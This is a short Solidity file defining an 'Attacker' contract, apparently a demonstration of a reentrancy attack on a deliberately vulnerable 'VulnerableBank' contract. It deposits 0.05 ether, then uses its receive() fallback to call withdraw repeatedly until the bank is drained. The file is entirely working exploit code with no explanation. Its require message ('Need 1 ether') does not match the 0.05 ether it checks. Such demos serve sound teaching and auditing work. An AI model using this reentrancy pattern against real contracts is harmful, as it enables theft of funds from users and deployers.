pragma solidity ^0.8.20;

import {VulnerableBank} from "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public vulnerableBank;
    uint256 public constant ATTACK_AMOUNT = 0.05 ether;

    constructor(address _vulnerableBank) {
        vulnerableBank = VulnerableBank(_vulnerableBank);
    }

    function attack() public payable {
        require(msg.value >= ATTACK_AMOUNT, "Need 1 ether");

        vulnerableBank.deposit{value: ATTACK_AMOUNT}();
        vulnerableBank.withdraw();
    }

    receive() external payable {
        if (address(vulnerableBank).balance >= ATTACK_AMOUNT) {
            vulnerableBank.withdraw();
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getBalanceOf(address _address) public view returns (uint256) {
        return vulnerableBank.getBalanceOf(_address);
    }
}
